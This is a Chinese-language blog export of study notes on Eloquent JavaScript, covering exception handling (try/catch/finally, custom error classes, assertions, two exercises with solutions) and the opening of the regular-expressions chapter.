<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">promptNumber</span>(<span class="params">question</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="built_in">Number</span>(prompt(question));</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Number</span>.isNaN(result)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(promptNumber(<span class="string">"How many trees do you see?"</span>));</span><br></pre></td></tr></table></figure>

<p>现在任何调用<code>promptNumber</code>的代码必须检查是否实际的数字被读取，并且如果失败，需要以某种方式恢复，可能是再次询问或者填充一个默认值。或者也可以返回给调用者一个特殊值，用来表明它没能成功做成它被要求的事情。</p>
<p>在许多情况下，主要是错误很普遍的时候，并且调用者应该明确考虑它们，返回一个特殊值是一种好的表明错误的方式。它确实也有缺点。首先，要是函数可以返回任何可能的值呢？在这样的函数中，你将不得不采取一些措施如将结果包装在一个对象中，以此来区分成功还是失败。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lastElement</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(array.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">failed</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">element</span>: array[array.length - <span class="number">1</span>]&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回特殊值的第二个问题是他可能导致尴尬的代码。如果一段代码调用<code>promptNumber</code>10次，就不得不检查10次是否<code>null</code>被返回。并且如果对于查找<code>null</code>只是简单返回<code>null</code>，那么调用者反过来又要检查它。</p>
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>当一个函数不能继续正常执行下去的时候，我们想要做的是停止我们正在做的事情然后立刻跳到一个地方，这个地方知道如何处理这个问题。这就是异常处理所做的事情。</p>
<p>异常是一种使得遇到问题的代码抛出（raise/throw）异常成为可能的一种机制。异常可以是任意值。抛出一个异常有点像从一个函数超动力的返回：不仅跳出当前函数还会跳出它的调用者，一路向下直到第一个开启当前执行的调用。这叫做栈展开（unwinding stack）。你可能记得第三章提到过的函数栈。</p>
<p>如果异常总是向下一直到栈底，那么它们可能没有太多用途。它们只会提供一种新颖的方式去破坏你的程序。它们的强大之处在于，你可以沿着栈设置障碍去捕获异常。一旦你捕获到了异常，你就可以做点什么事情去解决这个问题，然后继续运行程序。</p>
<p>这是一个例子。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">promptDirection</span>(<span class="params">question</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = prompt(question);</span><br><span class="line">  <span class="keyword">if</span> (result.toLowerCase() == <span class="string">"left"</span>) <span class="keyword">return</span> <span class="string">"L"</span>;</span><br><span class="line">  <span class="keyword">if</span> (result.toLowerCase() == <span class="string">"right"</span>) <span class="keyword">return</span> <span class="string">"R"</span>;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Invalid direction: "</span> + result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">look</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (promptDirection(<span class="string">"Which way?"</span>) == <span class="string">"L"</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"a house"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"two angry bears"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"You see"</span>, look());</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Something went wrong: "</span> + error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>throw</code>关键字被用于抛出一个异常。捕获异常通过将一段代码包裹在<code>try</code>块中实现，后面跟着关键字<code>catch</code>。当<code>try</code>块中的代码导致抛出一个异常，<code>catch</code>块就会执行，括号中的名字绑定到异常值。在<code>catch</code>块完成之后，或者如果<code>try</code>块没有异常的完成了，程序将继续执行整个<code>try/catch</code>块后面的语句。</p>
<p>上面的例子中，我们使用了<code>Error</code>构造器去创造了一个异常值。这是一个标准JS构造器创造一个带有<code>message</code>属性的对象。在大多数的JS环境中，这个构造器的实例也聚集了关于异常创建时存在的调用栈信息，所谓的堆栈追踪（stack trace）。这个信息存储在<code>stack</code>属性中并且当试着去debug的时候可能是有用的：它告诉我们问题发生的函数和这个做了失败的调用的函数。</p>
<p>注意<code>look</code>函数完全忽略了<code>promptDirection</code>可能会出错的可能性。这是异常的一个大的优点：错误处理的代码只在错误发生的地方和要处理的地方才是必须的。处于中间位置的函数完全可以忽略。</p>
<p>嗯，大多数情况下是这样。</p>
<h2 id="异常后的清理工作"><a href="#异常后的清理工作" class="headerlink" title="异常后的清理工作"></a>异常后的清理工作</h2><p>异常的效果是另外一种控制流。每种可能导致异常的行为（几乎是每个函数调用和属性访问），可能导致控制突然离开你的代码。</p>
<p>这意味着当代码有几个副作用时，即便常规控制流看上去好像它们总是都会发生，异常也可能使得它们中的某些不会发生。</p>
<p>这是一个非常糟糕的银行业代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> accounts = &#123;</span><br><span class="line">  a: <span class="number">100</span>,</span><br><span class="line">  b: <span class="number">0</span>,</span><br><span class="line">  c: <span class="number">20</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAccount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> accountName = prompt(<span class="string">"Enter an account name"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!accounts.hasOwnProperty(accountName)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`No such account: <span class="subst">$&#123;accountName&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> accountName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">from, amount</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (accounts[<span class="keyword">from</span>] &lt; amount) <span class="keyword">return</span>;</span><br><span class="line">  accounts[<span class="keyword">from</span>] -= amount;</span><br><span class="line">  accounts[getAccount()] += amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>transfer</code>函数从一个给定账户转钱到另一个账户，其间询问转入账户的名字。如果给定一个不合法的账户名字，<code>getAcount</code>抛出一个异常。</p>
<p>但是<code>transfer</code>首先从转出账户扣除钱然后调用<code>getAcount</code>函数在它添加钱到另一个账户之前。如果在那个时间点被异常打断，就会让钱凭空消失了。</p>
<p>那段代码可以被写得更聪明些，比如在开始转钱之前调用<code>getAcount</code>。但是这样的问题常以更微妙的方式出现。即使函数看上去不会抛出异常，也可能会由于异常的情况或者包含程序员错误而抛出异常。</p>
<p>一种解决这个问题的方式是使用更少的副作用。再一次，一个编程风格，计算出新的值而不是修改存在的数据会有所帮助。如果一段代码停在了创造新值的过程中，没有人会看见半成品的值，并且这丝毫不是问题。</p>
<p>但是那不总是实用的。所以<code>try</code>语句还有一个额外的特性。它们可以后面跟着一个<code>finally</code>语句，可以与<code>catch</code>并存或者自己独立出现。一个<code>finally</code>块表明无论发生了什么，尝试去运行<code>try</code>块中的代码之后运行<code>finally</code>中的代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">from, amount</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (accounts[<span class="keyword">from</span>] &lt; amount) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">let</span> progress = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    accounts[<span class="keyword">from</span>] -= amount;</span><br><span class="line">    progress = <span class="number">1</span>;</span><br><span class="line">    accounts[getAccount()] += amount;</span><br><span class="line">    progress = <span class="number">2</span>;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (progress == <span class="number">1</span>) &#123;</span><br><span class="line">      accounts[<span class="keyword">from</span>] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个版本的函数追踪它的进度，并且如果离开的时候，它注意到在创造不一致的程序状态点中止，他会修复做过的破坏。</p>
<p>注意即使<code>finally</code>代码会在<code>try</code>块中抛出异常的时候运行，他也不干涉异常。在<code>finally</code>块运行之后，栈继续展开。</p>
<p>编写即使在异常出现在意料之外的地方可靠运行的程序是困难的。许多人根本不关心这个问题，并且因为异常通常是为特殊情况保留的，所以这个问题可能很少发生以至于从未被注意到。这是一件好事还是一件真正的坏事取决于当软件失败的时候会造成多大的破坏。</p>
<h2 id="选择捕获"><a href="#选择捕获" class="headerlink" title="选择捕获"></a>选择捕获</h2><p>当异常一直到栈底还未被捕获时，将被环境所处理。这句话的含义随着环境的不同而不同。在浏览器中，一个错误描述被打印到JS控制台（可以通过开发者工具查看）。NodeJS，这个我们将在20章讨论的无浏览器环境，对数据差错更加小心。当一个未处理的异常发生的时候将会终止整个进程。</p>
<p>对于程序员的错误，让错误随风过去往往是你能做的最好的选择。一个未被处理的异常是一种标记一个被破坏程序的合理的方式，并且JS控制台将会提供问题发生时，哪些函数调用在栈上的信息。</p>
<p>对于常规的可能发生的问题，因为未处理的异常而崩溃是一个糟糕的策略。</p>
<p>非法使用语言，如引用一个不存在的绑定，在<code>null</code>上查找属性，或者调用非函数，将会导致抛出异常。这样的异常也可以被捕获。</p>
<p>当进入<code>catch</code>体的时候，我们所知道的是我们的<code>try</code>体中的某部分导致了异常。但是我们不知道是什么导致了这个异常。</p>
<p>JS（一个明显的遗漏）没有提供选择性地捕获异常的直接支持：要么你捕获它们所有，要么一个都不捕获。这使得在写<code>catch</code>块的时候很容易假设你得到的异常就是你想的那个异常。</p>
<p>但是可能不是这样。可能违反了其他一些假设，或者你可能引入了一个可能导致异常的bug。这有一个例子尝试去一直调用<code>promptDirection</code>直到得到一个合法的答案。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> dir = promtDirection(<span class="string">"Where?"</span>); <span class="comment">// ← typo!</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"You chose "</span>, dir);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Not a valid direction. Try again."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>for(;;)</code>结构是一种有意创造不会自终止循环的一种方式。只有在合法的方向给定的时候我们才会跳出循环。但是我们拼错了<code>promptDirection</code>，这将会导致一个”undefined variable”错误。因为<code>catch</code>块完全忽略异常值<code>e</code>，假定它知道问题是什么，错误地将绑定错误以为是坏的输入的错误。这不仅导致一个无限循环，还埋葬了关于错误拼写绑定的有用的错误信息。</p>
<p>一般规则是，不要做空白的捕获异常，除非是想要将异常路由到某个地方。例如，在网络中告诉另一个系统我们的程序崩溃了。即便这样也要仔细考虑如何隐藏信息。</p>
<p>所以我们想要捕获一种特定类型的异常。我们可以通过<code>catch</code>块来检查是否我们得到的异常是我们感兴趣的异常并且如果不是就重新抛出异常。但是我们怎么识别一个异常？</p>
<p>我们可以对比异常的<code>message</code>属性与我们期待的错误信息。但是那是一种不可靠的写代码的方式，我们将使用供人类使用的信息来做编程决定。一旦有人改变了message，那么代码将停止工作。</p>
<p>相反，让我们定义一个新的错误类型，并使用<code>instanceof</code>去识别它。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InputError</span> <span class="keyword">extends</span> <span class="title">Error</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">promptDirection</span>(<span class="params">question</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = prompt(question);</span><br><span class="line">  <span class="keyword">if</span>(result.toLowerCase() == <span class="string">"left"</span>) <span class="keyword">return</span> <span class="string">"L"</span>;</span><br><span class="line">  <span class="keyword">if</span>(result.toLowerCase() == <span class="string">"right"</span>) <span class="keyword">return</span> <span class="string">"R"</span>;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> InputError(<span class="string">"Invalid direction: "</span> + result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新的error类继承自<code>Error</code>。它没有定义自己的构造器，也就意味着它继承自<code>Error</code>的构造器，并接受一个字符串参数。事实上，它并没有定义任何东西，这个类是空的。<code>InputError</code>对象表现得类似<code>Error</code>对象，除了他们有不同的类名以便我们区分它们。</p>
<p>现在循环可以仔细地捕获这些异常。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> dir = promptDirection(<span class="string">"Where?"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"You chose "</span>, dir);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e <span class="keyword">instanceof</span> InputError) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"Not a valid direction. Try again."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这只会捕获<code>InputError</code>的实例，并且忽略不相关的异常。如果重新引入了拼写错误，未定义异常将会恰当地报告。</p>
<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>断言就是程序中检查某事是否表现得如它应该表现得一样的检查。它们不被用于正常操作可能出现的情况，而是去发现程序员的错误。</p>
<p>例如，如果<code>firstElement</code>作为一个不应该被在空数组上调用的函数，我们可以这样写：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">firstElement</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(array.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"firstElement called with []"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，代替悄悄地返回<code>undefined</code>（当获取一个不存在的数组属性时返回），而是会当你一旦错误使用的时候就大声爆破掉你的程序。这使得错误发生的时候不至于被忽视并且很容易找到原因。</p>
<p>我不推荐对每个可能的不好的输入写断言。那将是大量的工作并且可能产生非常讨厌的代码。你可以把它们保留给那些容易犯的错或者是那些你自己犯的错误。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>错误和不好的输入是生活的事实。编程中一个重要的方面就是发现，诊断和修复bug。如果你有自动化测试套件或者向程序中添加断言问题就会变得更容易去注意。</p>
<p>程序控制外的因素导致的问题通常应该被优雅地处理。有时，当问题可以在本地处理时，特殊的返回值是一种追踪它们的好方式。否则，异常可能更受偏爱。</p>
<p>抛出一个异常导致调用栈展开直到下一个封闭的<code>try/catch</code>块，或者直到堆栈的底部。异常值将会被给到捕获异常的<code>catch</code>块的参数，并且应该核实它是期望的异常种类然后做点什么。为了帮助处理由异常导致的不可预测的控制流，<code>finally</code>块可被用于确保当一个块完成时<code>finally</code>块中的代码总会运行。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="RETRY"><a href="#RETRY" class="headerlink" title="RETRY"></a>RETRY</h3><p>假设你有一个函数<code>primitiveMultiply</code>有20%的几率将两个数相乘，有80%的几率抛出<code>MultiplicatorUnitFailure</code>类型的异常。写一个函数包装这个笨重的函数并且让他持续尝试直到一次成功的调用，在那之后返回结果。</p>
<p>确保你只处理你尝试去解决的异常。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MultiplicatorUnitFailure</span> <span class="keyword">extends</span> <span class="title">Error</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveMultiply</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">Math</span>.random() &lt; <span class="number">0.2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> MultiplicatorUnitFailure(<span class="string">"Klunk"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reliableMultiply</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> primitiveMultiply(a, b);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="keyword">if</span>(e <span class="keyword">instanceof</span> MultiplicatorUnitFailure) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"OOPS..failure"</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(reliableMultiply(<span class="number">8</span>, <span class="number">8</span>));</span><br><span class="line"><span class="comment">// -&gt; 64</span></span><br></pre></td></tr></table></figure>

<h3 id="锁着的盒子"><a href="#锁着的盒子" class="headerlink" title="锁着的盒子"></a>锁着的盒子</h3><p>考虑下面的（相当做作的）对象：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> box = &#123;</span><br><span class="line">  locked: <span class="literal">true</span>,</span><br><span class="line">  unlock() &#123; <span class="keyword">this</span>.locked = <span class="literal">false</span>; &#125;,</span><br><span class="line">  lock() &#123; <span class="keyword">this</span>.locked = <span class="literal">true</span>;  &#125;,</span><br><span class="line">  _content: [],</span><br><span class="line">  <span class="keyword">get</span> content() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.locked) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Locked!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这是一个带锁的盒子。有一个数组在盒子中，但是只能在盒子未被锁的时候才能获取。直接获取私有的<code>_content</code>属性是被禁止的。</p>
<p>写一个叫做<code>withBoxUnlocked</code>的函数，接受一个函数值作为参数，解锁盒子，运行函数，并且确保函数返回前盒子被再次锁上，不考虑是否参数函数正常返回还是抛出一个异常。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> box = &#123;</span><br><span class="line">  locked: <span class="literal">true</span>,</span><br><span class="line">  unlock() &#123; <span class="keyword">this</span>.locked = <span class="literal">false</span>; &#125;,</span><br><span class="line">  lock() &#123; <span class="keyword">this</span>.locked = <span class="literal">true</span>;  &#125;,</span><br><span class="line">  _content: [],</span><br><span class="line">  <span class="keyword">get</span> content() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.locked) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Locked!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withBoxUnlocked</span>(<span class="params">body</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Your code here</span></span><br><span class="line">  <span class="keyword">let</span> locked = box.locked;</span><br><span class="line">  <span class="keyword">if</span>(!locked) <span class="keyword">return</span> body();</span><br><span class="line">  </span><br><span class="line">  box.unlock();</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> body();</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    box.lock();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">withBoxUnlocked(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  box.content.push(<span class="string">"gold piece"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  withBoxUnlocked(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Pirates on the horizon! Abort!"</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Error raised:"</span>, e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(box.locked);</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ9</title>
    <url>/2019/01/05/EJ9/</url>
    <content><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>编程工具和技术以一种混乱的，进化的方式生存和传播。并不总是漂亮的或聪明的那些最后会胜出，而是那些在市场中功能良好或者刚好与另一项成功的技术结合在一起的那些。</p>
<p>这一章，我将会讨论一个这样的工具，正则表达式。正则表达式是一种在字符串数据中描述模式的方式。它们是一个小的独立的语言，并且是JS和许多语言和系统的一部分。</p>
<p>正则表达式是难于对付的，同时又是极度有用的。他们的语法看上去比较神秘，并且JS为它们提供的编程接口难于处理。但是它们是检查和处理字符串很有力的工具。正确理解正则表达式将使你成为一个更高效的程序员。</p>
<a id="more"></a>

<h2 id="创造一个正则表达式"><a href="#创造一个正则表达式" class="headerlink" title="创造一个正则表达式"></a>创造一个正则表达式</h2><p>一个正则表达式就是一种类型的对象。它既可以通过<code>RegExp</code>构造器创建也可以以<code>/</code>字符间包含模式这样的字面量形式来创建。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> re1 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"abc"</span>);</span><br><span class="line"><span class="keyword">let</span> re2 = <span class="regexp">/abc/</span>;</span><br></pre></td></tr></table></figure>

<p>这两个正则表达式都代表了相同的模式：a后面跟着b后面跟着c。</p>
<p>当使用<code>RegExp</code>构造器时，模式以字符串的形式书写，所以通常用于反斜线的规则在这里也适用。</p>
<p>第二种模式出现在正斜线之间，对待反斜线有些许不同。首先，因为一个正斜线终止模式，我们需要在任何组成模式的正斜线前加一个反斜线。<strong>除此之外，非特殊字符组成部分（如\n）的反斜线将会被保留，而不是像字符串中被忽略，</strong>并且改变模式的意义。一些字符，像问号和加号，在正则表达式中有特殊的含义，如果想表达字符本身必须前置反斜线。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> eighteenPlus = <span class="regexp">/eighteen\+/</span>;</span><br></pre></td></tr></table></figure>

<h2 id="测试匹配"><a href="#测试匹配" class="headerlink" title="测试匹配"></a>测试匹配</h2><p>正则表达式对象有许多方法。最简单的一个就是<code>test</code>方法。如果给他传递一个字符串，将会返回是否字符串包含表达式中的模式。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/abc/</span>.test(<span class="string">"abcde"</span>));</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/abc/</span>.test(<span class="string">"abxde"</span>));</span><br><span class="line"><span class="comment">// → false</span></span><br></pre></td></tr></table></figure>

<p>仅由非特殊字符组成的正则表达式仅仅表示这个字符序列。如果<em>abc</em>出现在我们要测试的字符串的任何位置*不仅仅是开始），<code>test</code>都将返回<code>true</code>。</p>
<h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>判断一个字符串是否包含<code>abc</code>也可以通过调用<code>indexOf</code>实现。正则表达式允许我们表达更复杂的模式。</p>
<p>假设我们想要匹配任意数字。在正则表达式中，在方括号中放置一组字符，那么会匹配方括号中的任意字符。</p>
<p>下面的表达式都会匹配所有的包含数字的字符串。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/[0123456789]/</span>.test(<span class="string">"in 1992"</span>));</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/[0-9]/</span>.test(<span class="string">"in 1992"</span>));</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>
<p>在方括号内部，两个字符间的短横线(hyphen)可以被用于表明一个范围间的字符，其中的顺序由字符的<em>Unicode</em>编码决定。在这个顺序中，字符0到9彼此相邻（代码48到57），所以<code>[0-9]</code>覆盖所有字符并且匹配任意数字。</p>
<p>一些常见的字符组都有自己内置的缩写。数字是他们其中一个：<code>\d</code>和<code>[0-9]</code>有相同的含义。</p>
<p><code>\d</code> 任意数字字符</p>
<p><code>\w</code> 一个字母数字字符（单词字符）</p>
<p><code>\s</code> 任意空白字符（空格，tab，newline和类似的字符）</p>
<p><code>\D</code> 非数字字符</p>
<p><code>\W</code> 非字母数字字符</p>
<p><code>\S</code> 非空白字符</p>
<p><code>.</code> 除了newline之外的任意字符</p>
<p>所以你可以使用下面的表达式匹配一个形如01-30-2003 15:20的日期和时间格式。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> dateTime = <span class="regexp">/\d\d-\d\d-\d\d\d\d \d\d:\d\d/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(dateTime.test(<span class="string">"01-30-2003 15:20));</span></span><br><span class="line"><span class="string">// -&gt; true</span></span><br><span class="line"><span class="string">console.log(dateTime.test("</span><span class="number">30</span>-jan<span class="number">-2003</span> <span class="number">15</span>:<span class="number">20</span><span class="string">"));</span></span><br><span class="line"><span class="string">// -&gt; false</span></span><br></pre></td></tr></table></figure>

<p>这看上去很糟糕。表达式的一半都是反斜线，产生了背景噪声使得很难注意到实际的要表达的模式。我们稍后将看到一个改进版本。</p>
<p>这些反斜线代码也可被用在方括号内部。例如，<code>[\d.]</code>表示任何数字或者是一个句号字符。但是句号本身，如果在方括号中间，就失去了特殊的含义。其他特殊字符如<code>+</code>也是一样。</p>
<p>为了反转字符集，也就是匹配除了集合中列出的那些字符，可以在起始括号后写一个插入字符<code>^</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> notBinary = <span class="regexp">/[^01];</span></span><br><span class="line"><span class="regexp">console.log(notBinary.test("110010000110110"));</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ -&gt; false</span></span><br><span class="line"><span class="regexp">console.log(notBinary.test("1100103300"));</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ -&gt; true</span></span><br></pre></td></tr></table></figure>

<h2 id="重复模式的一部分"><a href="#重复模式的一部分" class="headerlink" title="重复模式的一部分"></a>重复模式的一部分</h2><p>我们现在知道如何匹配一位数字。要是我们想匹配一位或多位数字序列呢？</p>
<p>当在正则表达式中放置一个<code>+</code>，表明前面的元素可能不止一次出现。因此，<code>/\d+/</code>匹配一位或更多位的字符。</p>
